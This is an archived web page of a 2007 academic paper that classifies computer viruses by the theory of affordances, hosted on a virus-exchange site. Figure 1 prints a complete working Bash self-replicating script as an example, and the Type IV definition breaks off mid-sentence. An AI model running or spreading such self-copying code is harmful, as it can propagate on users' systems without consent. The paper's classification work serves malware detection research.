<?xml version="1.0"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
<title>Matt Webster, Grant Malcolm 'Classification of Computer Viruses Using the Theory of Affordances' (VX heaven)</title>
<meta http-equiv="content-type" content="text/html; charset=utf-8"/>
<meta name="Author" content="Matt Webster, Grant Malcolm"/>
<meta name="KeyWords" lang="en" content="computer virus, virus, virii,vx, компьютерные вирусы, вирус, вири, Webster, Matt; Malcolm, Grant,Classification of Computer Viruses Using the Theory of Affordances, archangel, viruses, java, anti, shell, file, theory, description, computer, models, software, wscript, reproductive, monitoring, affordances"/>
<meta name="Description" content="We present a novel classification of computer viruses based on a formalised notion of reproductive models that use Gibson's theory of affordances. A computer virus reproduction model consists of a labelled transition system to represent the states and actions involved in that virus's reproduction; a notion of entities that are active in the reproductive process, and are present in certain states; a sequence of actions corresponding to the means of reproduction of the virus; and a formalisation of the affordances that apply. Informally, an affordance is an action that one entity allows another to perform. For example, an operating system might afford a computer virus the ability to read data from the disk. We show how computer viruses can be classified according to whether any of their reproductive actions are afforded by other entities, or not. We show how we can further sub-classify based on whether abstract reproductive actions such as the self-description, reproductive mechanism or payload are afforded by other entities. We give examples of three computer virus reproduction models constructed by hand, and discuss how this method could be adapted for automated classification, and how this might be used to increase the efficiency of detection of computer viruses. To demonstrate this we give two examples of automated classification and show how the classifications can be tailored for different types of anti-virus software. Finally, we compare our approach with similar work, and give directions for future research."/>
<script type="text/javascript">
//<![CDATA[
try{if (!window.CloudFlare) {var CloudFlare=[{verbose:0,p:0,byc:0,owlid:"cf",bag2:1,mirage2:0,oracle:0,paths:{cloudflare:"/cdn-cgi/nexp/dok3v=1613a3a185/"},atok:"047a5bcbf67431883fc9ed25fba33612",petok:"ed8f39f2f781f2d6a00668df01dde2fdbb25b9c5-1498755750-1800",zone:"vxheaven.org",rocket:"a",apps:{}}];document.write('<script type="text/javascript" src="//ajax.cloudflare.com/cdn-cgi/nexp/dok3v=85b614c0f6/cloudflare.min.js"><'+'\/script>');}}catch(e){};
//]]>
</script>
<link rel="icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="stylesheet" type="text/css" href="/style.css"/><link rel="canonical" href="http://vxheaven.org/lib/amw01.html"/>
<script type="text/rocketscript" data-rocketsrc="https://apis.google.com/js/plusone.js">{"parsetags": "explicit"}</script>
</head>
<body bgcolor="#dbc8a0" text="#302000" link="#225599" vlink="#113366">
<div class="s1">
<div style="float:right;"><a href="/lib/index.php?tbs=1"><img src="/img/max.gif" alt="Maximize"/></a></div> <form id="lf" style="margin: 0; float: right;" method="get" action="/index.php"><input type="hidden" name="action" value="set"/><select name="lang" onchange="javascript:document.getElementById('lf').submit();"><option value="ru">Русский</option><option selected="selected" value="en">English</option><option value="ua">Українська</option><option value="de">Deutsch</option><option value="es">Español</option><option value="fr">Fran&ccedil;ais</option><option value="it">Italiano</option><option value="pl">Polski</option></select></form>
<div style="float: right;"><div id="plusone"></div></div>
<script type="text/rocketscript">gapi.plusone.render("plusone", {"size":"small","count":"true"});</script>
<div style="float: right;" class="addthis_toolbox addthis_default_style">
<script type="text/rocketscript">var addthis_config = { ui_click: true }</script>
<a style="text-decoration: none; font-size: 10pt;" href="/?action=addthis" class="addthis_button_compact">Bookmark</a>
<script type="text/rocketscript" data-rocketsrc="http://s7.addthis.com/js/250/addthis_widget.js#username=herm1t"></script>
</div>
<div style="float: right;">
<script type="text/rocketscript" data-rocketsrc="http://www.google.com/cse/brand?form=cse-search-box&amp;lang=en"></script>
<form action="/search.php" id="cse-search-box">
<input type="hidden" name="cx" value="002577580816726040001:z9_irkorydo"/>
<input type="hidden" name="cof" value="FORID:10"/>
<input type="hidden" name="ie" value="UTF-8"/>
<input type="text" name="q" size="12" value=" "/>
<input type="submit" name="sa" value="Search"/>
</form>
</div><h1><a href="/" style="text-decoration: none; color: #000000;">VX Heaven</a></h1>
<span class="nav"><a href="/lib/">Library</a> <a href="/vl.php">Collection</a> <a href="/src.php">Sources</a> <a href="/vx.php?id=eidx">Engines</a> <a href="/vx.php?id=tidx">Constructors</a> <a href="/vx.php?id=sidx">Simulators</a> <a href="/vx.php?id=uidx">Utilities</a> <a href="/links.php">Links</a> <a href="/donate.php" style="color: #706020" id="donate">Donate</a> <a href="/forum" style="text-decoration: underline;">Forum</a> </span><br clear="all"/>
</div>
<div class="s2"><h1>Classification of Computer Viruses Using the Theory of Affordances</h1><p><a href="/lib/?lang=en&amp;author=Webster%2C%20Matt">Matt Webster</a>, <a href="/lib/?lang=en&amp;author=Malcolm%2C%20Grant">Grant Malcolm</a><br/> <em> 2007</em></p><script type="text/rocketscript">var disqus_url = 'http://vxheaven.org/lib/amw01.html';</script><img src="/img/pdf.gif" alt="PDF"/><a href="/lib/pdf/Classification%20of%20Computer%20Viruses%20Using%20the%20Theory%20of%20Affordances.pdf">Download</a> PDF (226.1Kb) (You need to be registered on <a href="/forum">forum</a>)<br/>[<a style="" href="/lib/?lang=EN&amp;index=TH#amw01">Back to index</a>] [<a href="/lib/amw01.html#disqus_thread">Comments</a>]<br/> <form method="post" action="">
<img src="/img/cache/0b9fd596a90421f9f1f68a9760275737.gif" alt="\text{T_EX size}" valign="middle"/>
<select name="TeX_size"><option value="-2">-2</option><option value="-1">-1</option><option value="0" selected="selected">0</option><option value="1">1</option><option value="2">2</option><option value="3">3</option><option value="4">4</option><option value="5">5</option> </select>
<input type="submit" value="Scale"/>
</form>
 
<address>
Department of Computer Science, University of Liverpool, Liverpool, L69 3BX, UK.<br/>
Email: {matt,<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="bbdcc9dad5cfc6fbd8c8d895d7d2cd95dad895ced095">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>
</address>
<h2>Abstract</h2>
<p>We present a novel classification of computer viruses based on a formalised notion of reproductive models that use Gibson's theory of affordances. A computer virus reproduction model consists of a labelled transition system to represent the states and actions involved in that virus's reproduction; a notion of entities that are active in the reproductive process, and are present in certain states; a sequence of actions corresponding to the means of reproduction of the virus; and a formalisation of the affordances that apply. Informally, an affordance is an action that one entity allows another to perform. For example, an operating system might afford a computer virus the ability to read data from the disk. We show how computer viruses can be classified according to whether any of their reproductive actions are afforded by other entities, or not. We show how we can further sub-classify based on whether abstract reproductive actions such as the self-description, reproductive mechanism or payload are afforded by other entities. We give examples of three computer virus reproduction models constructed by hand, and discuss how this method could be adapted for automated classification, and how this might be used to increase the efficiency of detection of computer viruses. To demonstrate this we give two examples of automated classification and show how the classifications can be tailored for different types of anti-virus software. Finally, we compare our approach with similar work, and give directions for future research.</p>
<p><strong>Keywords:</strong> Computer virus - Malware - Classification - Formalisation - Reproduction - Models - Affordances - Detection.</p>
<h2>1 Introduction</h2>
<p>This paper describes a new approach to the classification of reproducing malware based on Gibson's Theory of Affordances [11]. (Informally, an affordance is an action that can be performed in an environment by an agent in collaboration with another agent in the environment.) This approach arose from work on the related problem of reproducer classification [29, 27], in which reproducers could be classified according to whether or not their selfdescription and reproductive mechanism, two essentials for reproduction, are afforded to the reproducer by an external agent or by the reproducer itself. For example, biological viruses such as the T4 bacteriophage afford themselves a self-description in the form of a genome encoded in RNA contained within the virus, but they lack a sufficient reproductive mechanism, which must be provided by an external agent in order for the virus to complete its reproductive process. In the case of the T4 bacteriophage, this external agent is a bacterium that can take the virus's genome and produce an offspring based on it. There are obvious parallels with computer viruses, which must produce an offspring based on a self-description (e.g., source code), which is passed to some reproductive mechanism (e.g., file input/output routines offered by an operating system) in order to complete a reproductive process. Computer viruses are therefore reproducers, and we can apply a similar method to their classification.</p>
<p>The original problem of classification in computer virology lay in distinguishing viruses from non-viruses [7], and to this end much of the literature in the area is concerned with this problem, which is essential to the functionality of anti-virus software. However, further sub-classifications of the class of computer viruses have been given in the literature. Adelman [1] divides the computer virus space into four disjoint subsets of computer viruses (benign, Epeian, disseminating and malicious). Spafford [22] gives five different generations of computer viruses which increase in complexity, from "Simple" to "Polymorphic". Weaver et al [25] have given a taxonomy of computer worms based on several criteria including target discovery and worm carrier mechanisms. Goldberg et al [12], Carrera &amp; Erd&eacute;lyi [6], Karim et al [15, 16] and Wehner [30] present classifications of malware based on phylogenetic trees, in which the lineage of computer viruses can be traced and a "family tree" of viruses constructed based on similar behaviours. Bonfante et al [3, 4] give a classification of computer viruses based on recursion theorems. Gheorghescu [10] gives a method of classification based on reuse of code blocks across related malware strains. A classification given by Bailey et al [2] is based on the clustering of malware that share similar abstract behaviours. In addition, both Filiol [8] and Sz&ouml;r [23] give comprehensive overviews of the state of the art of malware, including classification methods.</p>
<p>Most antivirus software vendors have their own schemes for malware naming, which involve some implicit classification, e.g., names like <tt>W32.Wargbot</tt> or <tt>W97M/TrojanDropper.Lafool.NAA</tt> give some information about the platform (e.g., 32-bit Microsoft Windows) and/or the primary reproductive mode of the virus (e.g., "trojan dropper"). Recently there have been efforts to standardise the many and varied malware naming schemes, e.g., the Common Malware Enumeration (CME) project [18] and the Computer Antivirus Research Organization (CARO) virus naming convention [5]. CME is still at an early stage, and the current status of CARO is unclear. However, it is clear that we are far from ubiquity with respect to malware naming schemes, as is revealed recent surveys [13, 10].</p>
<p>Our classification differs from previous work in that it is constructed upon a formalised abstract ontology of reproduction based on Gibson's theory of affordances. Using our ontology we can classify computer viruses at different abstraction levels, from behavioural abstractions in the vein of Filiol et al [9] to low-level assembly code semantical descriptions in the vein of our earlier work on metamorphic computer virus detection [28]. We are able to distinguish formally between viruses that require the help of external agency and those that do not, giving a potential application to prioritisation and increased efficiency for anti-virus software, which may be of particular use on systems where resources are limited. The recent trend of malware infection of mobile computing systems [20, 24, 31, 19] would be one such application. We show how this process could be automated, an advantage given the frequency of malware occurrence and the laboriousness of classification by hand.</p>
<p>In Section 2 we present our ontology, and give overviews of the various reproductive types. We give three examples of computer virus classification by constructing computer virus reproduction models by hand, and how this lets us compare different computer viruses under the same ontology. In Section 2 we discuss a potential application to computer virus detection; namely in the development of a classification that separates viruses that are difficult to detect at run-time by behaviour monitoring from those that are not. To this end, we present examples of models of reproductive processes at a much lower level, and show how these models might be generated algorithmically. Automating this process could give automated classification of viruses, either by static or dynamic analysis, and we can separate viruses into two distinct groups: those that are not reliant on external agency, and those that are. We show that we define the notion of external agency based on what is possible for different anti-virus software, and therefore the classification of viruses can be tailored to suit individual circumstances. We show how it is possible to develop metrics for comparing those viruses that depend on external entities, so that viruses that rely on external entities can be assessed for their potential difficulty of detection at run-time by behaviour monitoring. The overall aim of this application to computer virus detection is to enable prioritisation and increased efficiency for anti-virus software. For example, some viruses may be shown to be difficult to detect at run-time by behaviour monitoring, and therefore an anti-virus scanner could prioritise its scanning by non-behavioural means to search for these viruses first. We think this may be of particular use on systems where resources such as processor speed and memory are limited, such as mobile computing applications like cell phones, PDAs or smartphones. Finally, in Section 4 we give an overview of our approach. We compare it to other approaches to computer virus classification in the literature, and give directions for future research.</p>
<h2>2 Computer Virus Classification</h2>
<h3>2.1 Models of Computer Virus Reproduction</h3>
<p>Our models of computer virus reproduction are a special case of our earlier work on models of reproducers [29, 27]. Our classification of reproducers is based on the ontological framework given by Gibson's theory of affordances. Originally Gibson proposed affordances as an ecological theory of perception: animals perceive objects in their environment, to which their instincts or experience attach a certain significance based on what that object can afford (i.e., do for) the animal. For example, for a small mammal a cave affords shelter, a tree affords a better view of the surroundings, and food affords sustenance. These relationships between the animal and its environment are called affordances. Affordance theory is a theory of perception, and therefore we use the affordance idea as a metaphor: we do not suggest that a computer virus perceives its environment in any significant way, but we could say metaphorically that a file affords an infection site for a computer virus, for example.</p>
<p>For the purposes of our ontology and classification, an affordance is a relation between entities in a reproduction system. In the case of a particular computer virus, it is natural to specify the virus as an entity in most cases, with the other entities composed of those parts of the virus's environment which may assist the virus in some way. Therefore, we could include as entities such things as operating system application programming interfaces (APIs), disk input/output routines, networking APIs or protocols, services on the same or other computers, anti-virus software, or even the user. We are able to include such diverse entities in our models since we do not impose a fixed level of abstraction; the aim is to be able to give a framework that specifies the reproductive behaviour of computer viruses in a minimal way, so that classifications can be made to suit the particular circumstances we face; we may wish to tailor our classification so that viruses are divided into classes of varying degrees of difficulty of detection, for example.</p>
<p>We assume that any model of a reproductive process identifies the states of affairs within which the process plays itself out. For computer viruses, these states of affairs may be very clearly and precisely defined: e.g., the states of a computer that contains a virus, including the files stored on disk, the contents of working memory, and so forth. Alternatively, we can use abstract state transitions corresponding to abstract behaviours of the computer virus. Abstract actions have been used before to describe computer viruses [9, 2], and in the examples in this section we adopt that approach. We will demonstrate how these abstract models can be constructed, and how they are used in computer virus classification. Abstract models are usually based on an abstract sense of how the computer virus operates and interacts with its environment; different points of view can result in different abstract models of the same virus. These abstract models are shown to be useful to classify viruses according to different criteria, and based on whether they use external entities in their reproductive processes, and to what degree.</p>
<p>Two key elements of the states of a model are the entities that partake in the various states, and the actions that allow one state to evolve into another state. For a computer virus, these states could be abstract, or represent the states of the processor or virtual machine which executes the virus. The entities would be the parts of the computer system that enable the virus to reproduce; we might choose to include operating system APIs, network protocols, nodes or services on the network, disk input/output operations, calls to system libraries (e.g., DLLs on the Microsoft Windows platform), and so on. In general, we assume that a model identifies the key entities or agents that take part in the process being modelled, and has some way of identifying whether a particular entity occurs in a particular state of affairs (e.g., a network service may only be available at certain times). We also assume that a model identifies those actions that are relevant to the computer virus being modelled, and describes which actions may occur to allow one state of affairs to be succeeded by another. Therefore, we will use a labelled transition system to model the dynamic behaviour of a virus.</p>
<p>This basic framework allows us to talk about reproductive processes: we can say that reproduction means that there is some entity <img src="/img/cache/9e3669d19b675bd57058fd4664205d2a.gif" alt="v" valign="middle"/> (a computer virus), some state <img src="/img/cache/03c7c0ace395d80182db07ae2c30f034.gif" alt="s" valign="middle"/> (the initial state of the reproductive process) with <img src="/img/cache/9e3669d19b675bd57058fd4664205d2a.gif" alt="v" valign="middle"/> present in state <img src="/img/cache/03c7c0ace395d80182db07ae2c30f034.gif" alt="s" valign="middle"/> (denoted "<img src="/img/cache/6d933ba74bd1b1933b95d8b31cdc48c9.gif" alt="v \varepsilon s" valign="middle"/>" - see Definition 1 below) and some path <img src="/img/cache/3cecab4b453b1159ad166097d75237ef.gif" alt="p=a_1,\dots,a_n" valign="middle"/> of actions, such that <img src="/img/cache/83878c91171338902e0fe0fb97a8c47a.gif" alt="p" valign="middle"/> leads, through a succession of intermediate states, to a state <img src="/img/cache/085c9f0df11642cf704f40ffdf753055.gif" alt="s'" valign="middle"/> with <img src="/img/cache/6d933ba74bd1b1933b95d8b31cdc48c9.gif" alt="v \varepsilon s" valign="middle"/>. This, of course, allows for both abstract reproductive systems where we have identified abstract actions which correspond to the virus's behaviour, as well as low-level modelling at the assembly code or high-level language statement level. We assume that the relation <img src="/img/cache/6d933ba74bd1b1933b95d8b31cdc48c9.gif" alt="v \varepsilon s" valign="middle"/> can be made abstract enough to accommodate an appropriate laxity in the notion of entity: i.e., we should gloss <img src="/img/cache/6d933ba74bd1b1933b95d8b31cdc48c9.gif" alt="v \varepsilon s" valign="middle"/> as stating that the entity <img src="/img/cache/9e3669d19b675bd57058fd4664205d2a.gif" alt="v" valign="middle"/>, or a copy of <img src="/img/cache/9e3669d19b675bd57058fd4664205d2a.gif" alt="v" valign="middle"/>, or even a possible mutation of <img src="/img/cache/9e3669d19b675bd57058fd4664205d2a.gif" alt="v" valign="middle"/> by polymorphic or metamorphic means, is present in the state <img src="/img/cache/03c7c0ace395d80182db07ae2c30f034.gif" alt="s" valign="middle"/>. In computer virology, such an abstraction was explicit in the pioneering work of Cohen [7], where a virus was identified with the "viral set" of forms that the virus could take. This approach is useful for polymorphic or metamorphic viruses that, in an attempt to avoid detection, may mutate their source code.</p>
<p>So far we have given an informal discussion of affordances, as well as a justification for using labelled transition systems to model the reproductive behaviour of computer viruses. We will now define affordances formally as the set of actions that one entity affords another. We write <img src="/img/cache/d0bbab26665ca15ce1cfffe9d73c75a9.gif" alt="Aff(e,e')" valign="middle"/> for the actions that entity <img src="/img/cache/e1671797c52e15f763380b45e841ec32.gif" alt="e" valign="middle"/> affords to entity <img src="/img/cache/b3de4acf4668c2067091c166b31a1270.gif" alt="e'" valign="middle"/>. The idea is that these are actions that are available to <img src="/img/cache/b3de4acf4668c2067091c166b31a1270.gif" alt="e'" valign="middle"/> only in states where <img src="/img/cache/e1671797c52e15f763380b45e841ec32.gif" alt="e" valign="middle"/> is present. Thus, we require that a model carves up these actions in a coherent way: formally, <img src="/img/cache/0538ddbe184f77475e6db93c8324148c.gif" alt="a \in Aff (e, e')" valign="middle"/> implies that for any state <img src="/img/cache/03c7c0ace395d80182db07ae2c30f034.gif" alt="s" valign="middle"/> where <img src="/img/cache/b3de4acf4668c2067091c166b31a1270.gif" alt="e'" valign="middle"/> is present, the action <img src="/img/cache/0cc175b9c0f1b6a831c399e269772661.gif" alt="a" valign="middle"/> is possible (i.e., <img src="/img/cache/0cc175b9c0f1b6a831c399e269772661.gif" alt="a" valign="middle"/> leads to at least one state that succeeds <img src="/img/cache/03c7c0ace395d80182db07ae2c30f034.gif" alt="s" valign="middle"/>) only if <img src="/img/cache/e1671797c52e15f763380b45e841ec32.gif" alt="e" valign="middle"/> is also present in <img src="/img/cache/03c7c0ace395d80182db07ae2c30f034.gif" alt="s" valign="middle"/>.</p>
<p>This discussion is summarised in the following</p>
<p><strong>Definition 1</strong> A computer virus reproduction model <em>consists of</em>:</p>
<ul>
<li><em>a labelled transition system <img src="/img/cache/d41467d997366066938c14c2e13daaf5.gif" alt="(S,A,\mapsto)" valign="middle"/>, where <img src="/img/cache/5dbc98dcc983a70728bd082d1a47546e.gif" alt="S" valign="middle"/> is a set of states, <img src="/img/cache/7fc56270e7a70fa81a5935b72eacbe29.gif" alt="A" valign="middle"/> is a set of actions (labels), and <img src="/img/cache/64694d71640004d29f8cb99a483a288a.gif" alt="\mapsto" valign="middle"/> is a ternary relation for labelled transitions between states, s.t. if <img src="/img/cache/eee15e5a7ef0157e978ed0f737f4ed7b.gif" alt="s\mapsto^a s'" valign="middle"/>, the action <img src="/img/cache/0cc175b9c0f1b6a831c399e269772661.gif" alt="a" valign="middle"/> occurring in the state <img src="/img/cache/03c7c0ace395d80182db07ae2c30f034.gif" alt="s" valign="middle"/> leads to the new state <img src="/img/cache/085c9f0df11642cf704f40ffdf753055.gif" alt="s'" valign="middle"/>;</em></li>
<li><em>a set <img src="/img/cache/e2089ca428a5d237e5aa730c9308e486.gif" alt="Ent" valign="middle"/> of entities and a relation <img src="/img/cache/7e4433e2f5a0921aeccd1455fe194fb4.gif" alt="\underline\ \varepsilon\underline\ " valign="middle"/> between entities and states, where for <img src="/img/cache/0f5389b62cf8460f6676eaef7e3730a6.gif" alt="e \in Ent" valign="middle"/> and <img src="/img/cache/0718ed5a3e27d89dc5efb8160425a476.gif" alt="s \in S" valign="middle"/>, <img src="/img/cache/68629e699490021aed0dac1a69d5da86.gif" alt="e \varepsilon s" valign="middle"/> indicates that <img src="/img/cache/e1671797c52e15f763380b45e841ec32.gif" alt="e" valign="middle"/> is present in the state <img src="/img/cache/03c7c0ace395d80182db07ae2c30f034.gif" alt="s" valign="middle"/>;</em></li>
<li><em>a function <img src="/img/cache/09c9712d4db826f3c23b74708a345d49.gif" alt="Aff" valign="middle"/> that assigns to two entities <img src="/img/cache/e1671797c52e15f763380b45e841ec32.gif" alt="e" valign="middle"/> and <img src="/img/cache/b3de4acf4668c2067091c166b31a1270.gif" alt="e'" valign="middle"/>, a set <img src="/img/cache/d0bbab26665ca15ce1cfffe9d73c75a9.gif" alt="Aff(e,e')" valign="middle"/> of possible actions, in such a way that if <img src="/img/cache/0538ddbe184f77475e6db93c8324148c.gif" alt="a \in Aff (e, e')" valign="middle"/>, then for all states <img src="/img/cache/03c7c0ace395d80182db07ae2c30f034.gif" alt="s" valign="middle"/> with <img src="/img/cache/2913387c4cfff84ab81ba238dbdf550c.gif" alt="e' \varepsilon s" valign="middle"/>, <img src="/img/cache/0cc175b9c0f1b6a831c399e269772661.gif" alt="a" valign="middle"/> is possible in <img src="/img/cache/03c7c0ace395d80182db07ae2c30f034.gif" alt="s" valign="middle"/> (i.e., <img src="/img/cache/05b6b24bc226f36f41638433f3cfc117.gif" alt="s \mapsto^a s'" valign="middle"/> for some state <img src="/img/cache/085c9f0df11642cf704f40ffdf753055.gif" alt="s'" valign="middle"/>) only if <img src="/img/cache/68629e699490021aed0dac1a69d5da86.gif" alt="e \varepsilon s" valign="middle"/>. Notionally, <img src="/img/cache/d0bbab26665ca15ce1cfffe9d73c75a9.gif" alt="Aff(e,e')" valign="middle"/> is the set of affordances that <img src="/img/cache/e1671797c52e15f763380b45e841ec32.gif" alt="e" valign="middle"/> gives to <img src="/img/cache/b3de4acf4668c2067091c166b31a1270.gif" alt="e'" valign="middle"/>;</em></li>
<li><em>a path <img src="/img/cache/f0dee806e3346380a479c1b112d14b31.gif" alt="s \mapsto^w_* s'" valign="middle"/> where <img src="/img/cache/ffccfdd01a3f3981c531473e67802dfa.gif" alt="w \in A^*" valign="middle"/> and an entity <img src="/img/cache/952805d621e632b77b809fc246fe3cd7.gif" alt="v \in Ent" valign="middle"/> with <img src="/img/cache/6d933ba74bd1b1933b95d8b31cdc48c9.gif" alt="v \varepsilon s" valign="middle"/> and <img src="/img/cache/e3b839d733be01243fb32e0ef5a2f5d0.gif" alt="v \varepsilon s'" valign="middle"/>. Notionally <img src="/img/cache/9e3669d19b675bd57058fd4664205d2a.gif" alt="v" valign="middle"/> is the virus that reproduces in this model.</em></li>
</ul>
<p>We shall see below how these formal models of computer virus reproduction can be used to classify computer viruses and other forms of reproducing malware.</p>
<h3>2.2 Reproductive Types</h3>
<p>The key distinction in our classification is the ability to distinguish between computer viruses which require the help of external entities, and those that do not. We call the former "Type I" computer viruses, and the latter "non-Type I". As we shall see, we can further divide up the space of computer viruses according to whether or not certain key parts of a reproductive process such as the self-description and reproductive mechanism are afforded by external entities. (We distinguish between a reproductive mechanism and a reproductive <em>process</em>; the reproductive mechanism being that part of the reproductive process which involves producing an offspring based on the information in the self-description.) For the purposes of this sub-classification outside Type I, we may define subsets of actions which correspond to particular abstract actions. For example, in the case of computer viruses, we may decide that a given set of actions corresponds to the virus's payload, i.e., that part of the virus that does not cause the virus to reproduce, but instead produces some side-effect of virus infection, e.g., deleting all files of a certain type. In addition to the payload abstract action, previous work on reproducer classification [29, 27] showed that abstract actions corresponding to the self-description and reproductive mechanism of reproducers gave explanatory power. (For the sake of simplicity, we will refer to the sets of actions corresponding to the self-description and reproductive mechanism as <img src="/img/cache/f85be8a6d2a8317c903d8a912e6c9ea6.gif" alt="A_{sd}" valign="middle"/> and <img src="/img/cache/d1fca35693c68b1c28003445192f09be.gif" alt="A_rm" valign="middle"/> respectively.) We shall show below how the notions of self-description and reproductive mechanism have explanatory power in the case of computer viruses and other forms of reproducing malware.</p>
<h4>2.2.1 Type I Computer Viruses</h4>
<p>Type I computer viruses are those that do not require the help of external entities in their reproductive process. In terms of the reproduction models described earlier, we say that there are no actions in the reproductive process of a Type I computer virus that are afforded by any external entity.</p>
<h4>2.2.2 Non-Type I Computer Viruses</h4>
<p>The key characteristic of non-Type I computer viruses is that they require the help of an external entity. As we will show in Section, we can define external entities according to the abilities of different kinds of anti-virus software, and therefore use the classification to distinguish between computer viruses that are possible to detect at run-time by behaviour monitoring or not.</p>
<p>In addition we have divided non-Type I computer viruses into three further types.</p>
<p><strong>Type II</strong> computer viruses are those that require help with their reproductive mechanism, but not their self-description. Some types of computer virus contain a self-description in the form of a encoded version of their source code, e.g., viruses that are quines. Other might obtain a self-description at run-time by self-analysis. In terms of Type II computer virus reproduction models, there are no actions in the abstract reproductive action set <img src="/img/cache/f85be8a6d2a8317c903d8a912e6c9ea6.gif" alt="A_{sd}" valign="middle"/> (which is the set of actions corresponding to the self-description) which are afforded by an external entity to the virus, but there is at least one action in <img src="/img/cache/7dbbbaa9ea6db7dfca808d2ee00c3e61.gif" alt="A_{rm}" valign="middle"/> (which is the set of actions corresponding to the reproductive mechanism of the virus) which is afforded by an external entity.</p>
<p><strong>Type III</strong> computer viruses are those that require help with their self-description, but not their reproductive mechanism. Therefore, an example of a Type III computer virus might be a compiler. Compilers are capable of creating an executable version of any program in a given language, including themselves, but they cannot afford themselves a self-description - this is afforded by an external agent, e.g., a user, who inputs the compiler's own source code. Therefore all compilers can be modelled as Type III computer viruses. In terms of Type III computer virus reproduction models, there are no actions in the abstract reproductive action set <img src="/img/cache/7dbbbaa9ea6db7dfca808d2ee00c3e61.gif" alt="A_{rm}" valign="middle"/> which are afforded by an external entity to the virus, but there is at least one action in <img src="/img/cache/f85be8a6d2a8317c903d8a912e6c9ea6.gif" alt="A_{sd}" valign="middle"/> which is afforded by an external entity.</p>
<p><strong>Type IV</strong> computer viruses are those that require help with both their self-description and their reproductive mechanism. In terms of computer virus reproduction models, there is at least one action in <img src="/img/cache/7dbbbaa9ea6db7dfca808d2ee00c3e61.gif" alt="A_{rm}" valign="middle"/> and <img src="/img/cache/f85be8a6d2a8317c903d8a912e6c9ea6.gif" alt="A_{sd}" valign="middle"/> which is afforded by some external entity. This entity may be different for both <img src="/img/cache/7dbbbaa9ea6db7dfca808d2ee00c3e61.gif" alt="A_{rm}" valign="middle"/> and <img src="/img/cache/f85be8a6d2a8317c903d8a912e6c9ea6.gif" alt="A_{sd}" valign="middle"/>; the key feature here is that</p>
<h3>2.3 Example: Unix Shell Script Virus</h3>
<p>The virus given in Fig. 1 is a Unix shell script virus which runs when interpreted using the Bourne-again shell (Bash). The first three lines of the virus define three variables that contain the program code and aliases for single and double quotation marks. The next three statements of the program code output these data into a new file called .1. The seventh statement of the program appends the program code to .1, and the final statement of the program changes the file permissions of .1 so that it is executable. At this point the reproductive process is complete.</p>
<div class="bash" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #000000;">1</span> <span style="color: #007800;">st</span>=<span style="color: #ff0000;">'echo st=$sq${st}$sq &gt; .1;echo dq=$sq${dq}$sq &gt;&gt; .1; echo<br/>
&nbsp; &nbsp; &nbsp; sq=$dq${sq}$dq &gt;&gt; .1;echo $st &gt;&gt; .1; chmod +x .1'</span><br/>
<span style="color: #000000;">2</span> <span style="color: #007800;">dq</span>=<span style="color: #ff0000;">'&quot;'</span><br/>
<span style="color: #000000;">3</span> <span style="color: #007800;">sq</span>=<span style="color: #ff0000;">&quot;'&quot;</span><br/>
<span style="color: #000000;">4</span> <span style="color: #7a0874; font-weight: bold;">echo</span> <span style="color: #007800;">st</span>=<span style="color: #007800;">$sq</span><span style="color: black; font-style: italic;">${st}</span><span style="color: #007800;">$sq</span> <span style="color: #000000; font-weight: bold;">&gt;</span> .1;<br/>
<span style="color: #000000;">5</span> <span style="color: #7a0874; font-weight: bold;">echo</span> <span style="color: #007800;">dq</span>=<span style="color: #007800;">$sq</span><span style="color: black; font-style: italic;">${dq}</span><span style="color: #007800;">$sq</span> <span style="color: #000000; font-weight: bold;">&gt;&gt;</span> .1;<br/>
<span style="color: #000000;">6</span> <span style="color: #7a0874; font-weight: bold;">echo</span> <span style="color: #007800;">sq</span>=<span style="color: #007800;">$dq</span><span style="color: black; font-style: italic;">${sq}</span><span style="color: #007800;">$dq</span> <span style="color: #000000; font-weight: bold;">&gt;&gt;</span> .1;<br/>
<span style="color: #000000;">7</span> <span style="color: #7a0874; font-weight: bold;">echo</span> <span style="color: #007800;">$st</span> <span style="color: #000000; font-weight: bold;">&gt;&gt;</span> .1;<br/>
<span style="color: #000000;">8</span> <span style="color: #c20cb9; font-weight: bold;">chmod</span> +x .1<br/>
&nbsp;</div>
<p>Figure 1: Unix shell script virus.</p>
<p>For the sake of simplicity in this section and in Sections 2.5 and 2.6 we will present minimalistic models of virus behaviour. A more concrete model would specify the states of the Bash interpreter, including environmental variables and the state of the file store, along the lines of the algebraic specifications given in our earlier work [26, 28].</p>
